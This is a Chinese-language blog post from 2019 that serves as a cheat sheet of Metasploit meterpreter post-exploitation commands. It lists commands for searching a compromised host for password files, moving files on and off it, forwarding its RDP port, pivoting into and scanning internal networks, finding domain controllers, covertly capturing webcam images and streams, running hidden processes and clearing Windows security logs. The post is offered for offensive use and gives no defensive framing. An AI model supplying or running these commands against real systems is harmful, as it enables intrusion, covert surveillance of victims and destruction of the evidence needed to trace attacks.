---
layout: post
title: metasploit使用：meterpreter操作命令大全
date: 2019-09-19
categories: blog
tags: [meterpreter]
description: meterpreter操作命令大全
---

#### 基本命令
```shell
getuid查看权限
sysinfo查看系统信息
ipconfig
netstat -ano
arp
route
getproxy
ps
idletime查看主机闲置时间
shell进入cmd
pwd
ls
cd
search -f *pass*查找文件
cat
upload /tmp/hack.txt C:\\lltest上传
download c:\\lltest\\lltestpasswd.txt /tmp/下载
edit
mkdir
rm
lpwd查看本地目录
ls
lcd
```
#### 端口转发
```shell
portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口
```
#### 内网扫描
```shell
autoroute添加路由
run autoroute -s 192.168.17.0/24添加到目标环境网络
run autoroute –p查看添加的路由

run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389

run post/windows/gather/checkvm查看被控机器是否虚拟机
run post/linux/gather/checkvm是否虚拟机
run post/windows/gather/enum_applications查看安装软件信息
run post/windows/gather/enum_patches查看补丁
run post/windows/gather/enum_domain查找域控
```
####shell webcam
```
webcam_list查看摄像头
webcam_snap拍照
webcam_stream摄像头直播
```
####shell 执行文件
```
execute -H -i -f cmd.exe  创建新进程cmd.exe，-H不可见，-i交互
execute -f notepad.exe
```
#### 清除日志
```
clearav 清除windows中的应用程序日志、系统日志、安全日志
```












